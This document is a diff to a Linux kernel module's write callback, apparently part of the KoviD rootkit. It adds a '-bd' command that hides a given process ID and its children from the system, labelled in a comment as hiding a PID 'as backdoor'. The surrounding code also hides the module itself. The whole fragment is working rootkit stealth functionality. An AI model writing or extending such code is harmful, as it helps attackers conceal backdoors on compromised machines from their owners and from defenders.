@@ -465,8 +465,18 @@ static ssize_t write_cb(struct file *fptr, const char __user *user,
 
         buf[strcspn(buf, "\r\n")] = 0;
 
+        /* Hide PID as backdoor */
+        if(!strncmp(buf, "-bd", MIN(3, size))) {
+            char *tmp = &buf[4];
+            int val = 0;
+            tmp[strcspn(tmp, " ")] = 0;
+            if (kstrtoint(tmp, 10, &val)) {
+                prerr("Failed kstrtoint\n");
+            } else {
+                kv_hide_task_by_pid(val, 1, CHILDREN);
+            }
         /* hide kovid module */
-        if(!strcmp(buf, "-h") && !op_lock) {
+        } else if(!strcmp(buf, "-h") && !op_lock) {
             static unsigned int msg_lock = 0;
             if(!msg_lock) {
                 msg_lock = 1;
